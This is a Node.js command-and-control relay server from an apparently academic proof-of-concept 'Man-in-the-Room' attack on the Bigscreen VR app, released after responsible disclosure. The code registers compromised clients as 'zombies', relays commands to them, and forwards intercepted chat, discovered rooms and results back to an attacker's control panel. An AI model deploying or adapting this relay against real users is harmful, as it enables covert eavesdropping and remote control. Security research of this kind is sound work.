/**
 * Man-in-the-Room Attack and Command & Control Server Proof of Concept — Bigscreen
 *
 * Vondracek Martin mvondracek vondracek.mar@gmail.com
 *
 * Security and Forensics of Immersive Virtual Reality Social Applications
 * Cyber Forensics Research & Education Group                 https://www.unhcfreg.com/
 * Tagliatela College of Engineering                          https://www.newhaven.edu/engineering/
 * University of New Haven                                    https://www.newhaven.edu
 * 300 Boston Post Rd, West Haven, CT 06516
 *
 * DISCLAIMER: This software is a part of the cyber forensic research carried out by the research group UNHcFREG @ TCoE
 * at the University of New Haven, CT, USA. This software was developed as a proof of concept Man-in-the-Room attack.
 * Details concerning the research were kept private, the software vendor (Bigscreen, Inc.) was then contacted during
 * responsible disclosure. No harm has been done to the official infrastructure and users. Authors assume no liability
 * and are not responsible for any misuse or damage caused by this software. This software is intended as a proof
 * of concept only. The end user of this software agrees to use this software for education and research purposes only.
 */

'use strict';

const nodeStatic = require('node-static');
const http = require('http');
const WebSocket = require('ws');
require('log-timestamp');

//region Web server hosting the MitR Rogue App
let fileServer = new(nodeStatic.Server)();
let app = http.createServer(function(req, res) {
  fileServer.serve(req, res);
}).listen(8080);
console.debug('DEBUG', 'Static HTTP server started.');
//endregion

let zombies = {};
let controlPanelWs = null; // websocket connection to the control panel
const webSocketServer = new WebSocket.Server({port:8081});
webSocketServer.on('connection', function(ws) {
    console.log('New connection established.');
    ws.on('message', function(data) {
        let message = JSON.parse(data);
        console.debug(message);
        switch(message.type) {
            case 'control-panel-connect':
                console.log('Control panel WebSocket connected');
                if(controlPanelWs !== null){
                    console.warn('WARN', 'Previous Control panel WebSocket overwritten.')
                }
                controlPanelWs = ws;
                break;
            case 'zombie-register': {
                if (controlPanelWs === null){
                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
                    return;
                }
                if (controlPanelWs.readyState !== WebSocket.OPEN) {
                    console.error('ERROR', 'Control panel WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                zombies[message.uuid] = ws;
                console.log('New zombie:', message.uuid);
                controlPanelWs.send(data);
                break;
            }
            case 'zombie-cmd':
            case 'zombie-ping':
            {
                let destinationWs = zombies[message.uuid];
                if(destinationWs === null){
                    console.error('ERROR', 'Zombie Websocket with given id was not found', message.uuid);
                    return;
                }
                if (destinationWs.readyState !== WebSocket.OPEN) {
                    console.error('ERROR', 'Zombie WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                destinationWs.send(data);
                break;
            }
            case 'zombie-result':
            case 'zombie-pong':
            {
                if (controlPanelWs === null){
                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
                    return;
                }
                if(controlPanelWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                controlPanelWs.send(data);
                break;
            }
            case 'chat':
                if (controlPanelWs === null){
                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
                    return;
                }
                if(controlPanelWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                controlPanelWs.send(data);
                console.log('FWD: %s', data);
                break;
            case 'room-discovered':
                if (controlPanelWs === null){
                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
                    return;
                }
                if(controlPanelWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                controlPanelWs.send(data);
                console.log('FWD: %s', data);
                break;
            case 'log':
                if (controlPanelWs === null){
                    console.error('ERROR', 'Control panel WebSocket does not exist yet.', message);
                    return;
                }
                if(controlPanelWs.readyState !== WebSocket.OPEN){
                    console.error('ERROR','Control panel WebSocket is not open. Cannot forward: %s', message);
                    return;
                }
                controlPanelWs.send(data);
                console.log('FWD: %s', data);
                break;
            default:
                console.warn('WARN', 'unexpected data', data);
        }
    });
});
console.debug('DEBUG', 'Relay WebSocket server started.');
console.log('In case of errors, please check `relayWebSocketServerUrl` and `webServerUrl` configuration' +
    ' of the Command and Control panel.');
